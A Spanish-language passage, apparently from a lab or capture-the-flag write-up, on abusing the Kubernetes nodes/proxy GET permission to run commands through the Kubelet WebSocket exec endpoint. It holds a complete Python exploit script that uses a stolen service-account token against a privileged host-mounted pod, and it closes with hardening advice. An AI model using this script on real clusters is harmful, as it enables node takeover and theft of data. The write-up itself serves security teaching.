Permiso crítico: nodes/proxy con verbo GET. Este permiso, aunque parece de solo lectura, puede ser weaponizado para ejecutar comandos en cualquier pod del clúster a través del Kubelet API vía WebSocket.

El vector de ataque funciona porque el Kubelet no distingue entre el permiso GET del API server proxy y el CREATE requerido para ejecutar comandos, permitiendo un WebSocket upgrade no autenticado.

El pod node-exporter tiene el filesystem raíz del host montado (hostPath /) y corre como privilegiado. Creamos un script para ejecutar comandos vía WebSocket Kubelet:

#!/usr/bin/env python3
import asyncio
import ssl
import sys

import websockets

NODE = "10.129.50.160"
NE_NS = "monitoring"
NE_POD = "prometheus-prometheus-node-exporter-nmntq"
NE_CNT = "node-exporter"

TOKEN = open("/var/run/secrets/kubernetes.io/serviceaccount/token").read().strip()
COMMAND = sys.argv[1] if len(sys.argv) > 1 else "id"


async def ws_exec(cmd_parts):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    args = "&".join(f"command={part}" for part in cmd_parts)
    url = (
        f"wss://{NODE}:10250/exec/{NE_NS}/{NE_POD}/{NE_CNT}"
        f"?output=1&error=1&{args}"
    )

    async with websockets.connect(
        url,
        ssl=ctx,
        additional_headers={"Authorization": f"Bearer {TOKEN}"},
        subprotocols=["v4.channel.k8s.io"],
        open_timeout=10,
    ) as ws:
        try:
            while True:
                data = await asyncio.wait_for(ws.recv(), timeout=5)
                if isinstance(data, bytes) and len(data) > 1:
                    sys.stdout.write(data[1:].decode("utf-8", errors="replace"))
                    sys.stdout.flush()
        except (asyncio.TimeoutError, websockets.exceptions.ConnectionClosed):
            pass


asyncio.run(ws_exec(COMMAND.split()))

Recomendaciones de Seguridad Link to heading

  • LangFlow: mantener actualizado a la última versión y restringir el acceso a la API de ejecución de flujos
  • JWT: deshabilitar el algoritmo none en el servidor; usar una lista blanca de algoritmos permitidos (solo HS256 o RS256)
  • RBAC en Kubernetes: evitar el permiso nodes/proxy incluso con verbo GET; usar políticas de red y controles de acceso más granulares
  • Pods privilegiados: evitar el uso de privileged: true y monturas hostPath del raíz en pods de monitoreo; usar seccomp, AppArmor y PodSecurityPolicies
  • Secretos en entorno: no exponer contraseñas en variables de entorno; usar un gestor de secretos como HashiCorp Vault o Kubernetes Secrets con encryptación
